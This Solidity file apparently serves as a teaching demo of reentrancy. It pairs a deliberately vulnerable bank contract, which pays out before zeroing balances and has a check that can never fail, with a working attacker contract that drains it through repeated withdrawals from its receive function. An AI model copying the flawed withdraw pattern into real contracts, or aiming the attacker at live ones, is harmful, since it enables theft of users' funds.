// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract VulnerableBank{

    mapping (address => uint256) balance; // a mapping called balance which maps a users address to an amount

    function deposit() external payable { // a deposit function that has `external` visability so can be called from outside and is `payable`
        balance[msg.sender] += msg.value; // taking note of the balance of each address held in hte mapping 
    }

    function withdraw() external payable { // the withdraw funcion again `external` and payble
        require(balance[msg.sender] >= 0, "Note Enough Ether"); // a require condition - that requires the persons 
        // (msg.sender) account to have more eth init 
        payable(msg.sender).call{value:balance[msg.sender]}(""); // .call{} is a low-level function in Solidity that sends 
        // a message (call) to another contract or address. 
        // It can include ether with the call.{value:balance[msg.sender]} specifies the amount of ether to send. 
        // Here, value:balance[msg.sender] means that the amount of ether specified by balance[msg.sender] is sent with the call. 
        // The balance mapping holds the ether balance for each address, so balance[msg.sender] is the amount of ether that the msg.sender 
        // can withdraw.
        //(""): The empty string "" inside the parentheses indicates that no additional data is sent with the call. 
        //This is because .call can also be used to call functions in other contracts, and the empty string means that no function is being called here—it's just a plain ether transfer.
        balance[msg.sender]  = 0; // here the callers balance is being adjusted
    }

    function banksBalance() public view returns(uint256) {
        return address(this).balance;
    
    }

    function userBalance(address _address) public view returns(uint256) {
        return balance[_address];
    }
}

contract LetsRobTheBank{

    VulnerableBank bank;

    constructor (address payable _target)   {
        bank = VulnerableBank(_target);
    }

    function attack() public payable {
        bank.deposit{value:1 ether} ();
        bank.withdraw();
    }

    function attackerBalance() public view returns(uint256) {
        return address(this).balance;

    }

    receive() external payable {
        if(bank.banksBalance() >1 ether) {
            bank.withdraw();
        }
    }
}


